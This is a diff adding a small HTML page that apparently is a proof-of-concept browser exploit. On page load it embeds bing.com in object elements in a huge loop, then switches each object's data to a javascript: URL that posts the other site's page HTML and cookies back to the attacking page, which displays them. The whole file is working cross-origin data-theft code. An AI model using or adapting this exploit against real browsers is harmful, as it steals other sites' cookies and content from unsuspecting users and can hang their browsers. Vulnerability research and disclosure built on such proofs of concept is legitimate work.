@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      window.onload = function () {
+        for (let i = 0; i < 10000000000; i++) {
+          const object = document.createElement("object");
+          object.setAttribute("data", "http://www.bing.com");
+          document.body.appendChild(object);
+          object.onload = function () {
+            object.data =
+              "javascript:var t=top;with(document)t.postMessage('HTML='+body.innerHTML+'&COOKIE='+cookie,'*');";
+            object.innerHTML = "foobar";
+          };
+        }
+      };
+
+      window.onmessage = function (m) {
+        alert(m.data);
+      };
+    </script>
+  </body>
+</html>
